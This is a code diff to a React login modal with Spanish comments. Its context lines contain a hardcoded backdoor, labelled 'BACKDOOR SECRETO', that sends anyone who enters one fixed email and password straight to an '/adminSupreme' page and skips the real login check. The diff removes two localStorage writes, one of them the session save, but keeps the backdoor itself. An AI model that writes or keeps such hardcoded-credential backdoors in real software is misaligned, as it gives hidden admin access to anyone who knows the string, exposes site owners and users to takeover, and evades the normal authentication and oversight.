@@ -29,7 +29,6 @@ export function LoginModal({ trigger }) {
         try {
             // BACKDOOR SECRETO: Acceso Directo
             if (email === "putoboto@demierda.com" && password === "abriteporfavor") {
-                localStorage.setItem('supreme_access', 'true');
                 toast({ title: "ACCESO SUPREMO", description: "Entrando..." });
                 window.location.href = '/adminSupreme';
                 return;
@@ -46,8 +45,7 @@ export function LoginModal({ trigger }) {
                 throw new Error(result?.error || "Credenciales inválidas");
             }
 
-            // Guardar sesión custom en LocalStorage
-            localStorage.setItem('comercio_session', JSON.stringify(result));
+
 
             toast({ title: "Bienvenido", description: `Hola, ${result.nombre_comercio}` });
             setOpen(false);
